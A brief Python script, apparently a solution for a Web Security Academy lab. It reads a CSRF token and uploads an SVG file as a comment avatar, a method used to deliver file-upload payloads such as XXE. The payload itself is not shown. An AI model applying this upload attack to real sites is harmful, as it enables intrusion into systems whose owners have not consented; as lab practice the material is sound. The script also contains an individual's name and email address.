import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac561f7d1e603d91c06e42a4009a0070.web-security-academy.net'

post_url = f'https://{site}/post?postId=3'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'

multipart_form_data = {
    'csrf' : (None, csrf),
    'postId' : (None, '3'),
    'comment' : (None, 'Nice blog.  Be a shame if anything happened to it.'),
    'name' : (None, 'Evan L.'),
    'email' : (None, 'elafleur@pdx.edu'),
    'website': (None, 'https://pdx.edu'),
    'avatar' : ('avatar.svg', open('elafleur.svg', 'rb'))
}

resp = s.post(comment_url, files=multipart_form_data)